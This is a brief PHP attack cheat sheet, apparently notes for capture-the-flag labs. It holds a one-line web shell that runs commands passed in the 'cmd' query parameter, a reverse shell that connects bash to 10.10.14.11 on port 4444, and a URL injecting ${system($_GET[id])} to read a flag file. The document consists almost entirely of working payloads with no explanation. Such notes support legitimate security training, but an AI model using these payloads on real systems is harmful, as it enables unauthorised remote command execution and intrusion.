# PHP

## Cookies

PHPSESSID

## Web shell

```php
<?php system($_GET["cmd"]); ?>
```

## Reverse shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'");?>
```

## Examples

```
http://<IP>:45338/?format=${system($_GET[id])}&id=cat%20../flag.txt
```